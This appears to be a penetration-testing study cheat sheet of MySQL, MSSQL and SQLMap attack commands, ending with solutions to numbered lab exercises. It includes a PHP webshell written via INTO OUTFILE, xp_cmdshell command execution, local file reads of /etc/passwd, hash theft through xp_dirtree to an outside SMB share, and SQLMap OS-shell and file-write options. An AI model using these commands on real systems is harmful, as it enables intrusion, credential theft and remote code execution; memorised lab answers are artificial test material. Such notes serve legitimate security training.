#SQL #MySQL #MSSQL #SQLMap  #sqlcmd #sqsh 

## Interacting with SQL Databases

|**Command**|**Description**|
|---|---|
|`mysql -u julio -pPassword123 -h 10.129.20.13`|Connecting to the MySQL server.|
|`sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`|Connecting to the MSSQL server.|
|`sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux.|
|`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.|
|`mysql> SHOW DATABASES;`|Show all available databases in MySQL.|
|`mysql> USE htbusers;`|Select a specific database in MySQL.|
|`mysql> SHOW TABLES;`|Show all available tables in the selected database in MySQL.|
|`mysql> SELECT * FROM users;`|Select all available entries from the "users" table in MySQL.|
|`sqlcmd> SELECT name FROM master.dbo.sysdatabases`|Show all available databases in MSSQL.|
|`sqlcmd> USE htbusers`|Select a specific database in MSSQL.|
|`sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`|Show all available tables in the selected database in MSSQL.|
|`sqlcmd> SELECT * FROM users`|Select all available entries from the "users" table in MSSQL.|
|`sqlcmd> EXECUTE sp_configure 'show advanced options', 1`|To allow advanced options to be changed.|
|`sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`|To enable the xp_cmdshell.|
|`sqlcmd> RECONFIGURE`|To be used after each sp_configure command to apply the changes.|
|`sqlcmd> xp_cmdshell 'whoami'`|Execute a system command from MSSQL server.|
|`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`|Create a file using MySQL.|
|`mysql> show variables like "secure_file_priv";`|Check if the the secure file privileges are empty to read locally stored files on the system.|
|`sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`|Read local files in MSSQL.|
|`mysql> select LOAD_FILE("/etc/passwd");`|Read local files in MySQL.|
|`sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`|Hash stealing using the `xp_dirtree` command in MSSQL.|
|`sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`|Hash stealing using the `xp_subdirs` command in MSSQL.|
|`sqlcmd> SELECT srvname, isremote FROM sysservers`|Identify linked servers in MSSQL.|
|`sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`|Identify the user and its privileges used for the remote connection in MSSQL.|

---

## SQLMap Cheat Sheet

| Command                                                                                                                                              | Description                                                                                                 |
| ---------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| `sql map -h`                                                                                                                                         | View the basic help menus                                                                                   |
| `sqlmap -hh`                                                                                                                                         | View the advanced help menu                                                                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                                           | Run SQLMap without asking for user input                                                                    |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                                                          | SQLMap with POST request                                                                                    |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                                                         | POST request specifying an injection point with an asterisk                                                 |
| `sqlmap -r req.txt`                                                                                                                                  | Passing a HTTP request file to SQLMap                                                                       |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                                                   | Specifying a cookie header                                                                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                                                | Specifying a PUT request                                                                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                                                        | Store traffic to an output file                                                                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                                                       | Specify verbosity level                                                                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                                                | Specify a prefix or suffix                                                                                  |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                                                     | Specify the level and risk                                                                                  |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                                             | Basic DB enumeration                                                                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                                                        | Tables enumeration                                                                                          |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                                                 | Table/row enumeration                                                                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                                                        | Conditional enumeration                                                                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                                                  | Database schema enumeration                                                                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                                                          | Searching for data                                                                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                                                       | Password enumeration and cracking                                                                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`                            | Anti-CSRF token bypass                                                                                      |
| `sqlmap --list-tampers`                                                                                                                              | List all tamper scripts                                                                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                                                         | Check for DBA privileges                                                                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                                                 | Reading a local file                                                                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                                            | Write a local file                                                                                          |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                                                | Spawning an OS shell                                                                                        |
| `sqlmap -u http://94.237.59.206:40788/case5.php?id=1 --risk=3 --batch --tables --dump -T flag5 --no-cast`                                            | Detect and exploit (OR) SQLi vulnerability in GET parameter `id`                                            |
| `sqlmap -u "http://94.237.62.195:44922/case6.php?col=id" --risk=3 --prefix=') --batch --tables --dump -T flag6`                                      | Detect and exploit SQLi vulnerability in GET parameter `col` having non-standard boundaries                 |
| `sqlmap -u "94.237.62.195:44922/case7.php?id=1" --union-cols=6 --technique=U --batch --tables --dump -T flag7`                                       | Detect and exploit SQLi vulnerability in GET parameter `id` by usage of UNION query-based technique         |
| `sqlmap -u "94.237.62.195:44922/case1.php?id=1" --batch --tables --dump -T flag1`                                                                    | Detect and exploit SQLi vulnerability in GET parameter `id`                                                 |
| `sqlmap -u "http://94.237.56.76:41828/case1.php?id=1" --search -C style`                                                                             | What's the name of the column containing "style" in it's name?                                              |
| `sqlmap -u "http://94.237.56.76:41828/case1.php?id=1" --search -T pass`                                                                              | What's the name of the tables containing "pass" in the name?                                                |
| `sqlmap -u "http://94.237.56.76:41828/case1.php?id=1" --dump `                                                                                       | Dump everything                                                                                             |
| `sqlmap -u "http://94.237.56.76:41828/case8.php" --data="id=1&t0ken=nfm1rCi8j8XzPcJsYBujBitNfwKW2MgKfGaliGEXE" --csrf-token="t0ken" --dump -T flag8` | Detect and exploit SQLi vulnerability in POST parameter `id`, while taking care of the anti-CSRF protection |
| `sqlmap -u "http://94.237.48.48:57027/case9.php?id=1&uid=206095350" --randomize=uid --dump -T flag9`                                                 | Detect and exploit SQLi vulnerability in GET parameter `id`, while taking care of the unique `uid`          |
| `sqlmap -r req.txt --tamper=between --chunked --dump -T flag10`                                                                                      | Detect and exploit SQLi vulnerability in POST parameter `id`                                                |
| `sqlmap -u "94.237.48.48:57027/case11.php?id=1" --tamper=between -v 3 --dump -T flag11 --no-cast`                                                    | Detect and exploit SQLi vulnerability in GET parameter `id`                                                 |
| `sqlmap -r req.txt --tamper=between --chunked --dump -T final_flag`                                                                                  | Identified exploitable json `id` parameter with Burp. Saved request as req.txt                              |
|                                                                                                                                                      |                                                                                                             |

---
